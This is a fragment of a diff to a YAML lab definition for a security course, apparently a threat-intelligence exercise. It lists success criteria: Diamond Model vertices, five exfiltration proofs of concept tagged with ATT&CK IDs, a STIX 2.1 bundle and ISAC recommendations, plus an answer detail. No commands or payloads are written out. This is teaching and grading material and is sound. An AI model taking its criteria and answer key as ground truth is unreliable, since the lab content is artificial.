+        Diamond Model 4 vertices + 5 exfil PoC + STIX 2.1 bundle 4 indicator + ISAC
+        권고 3.
+
         lecture w11 + lab #1·#2·#5·#7·#9 동시 행동 증명. *CTI dossier* 산출물.
+
+        '
       success_criteria:
       - Diamond Model 4 vertices
       - 5 exfil PoC + ATT&CK ID
@@ -611,5 +834,7 @@ steps:
       - 매트릭스/슬라이드 형식
   target_vm: attacker
   risk_level: low
-  answer_detail: |
-    학생이 ssh attacker 직접. CTI dossier — Diamond + STIX 양식. ISAC 공유. 실 전송 X.
+  answer_detail: '학생이 ssh attacker 직접. CTI dossier — Diamond + STIX 양식. ISAC 공유. 실
+    전송 X.
+
+    '
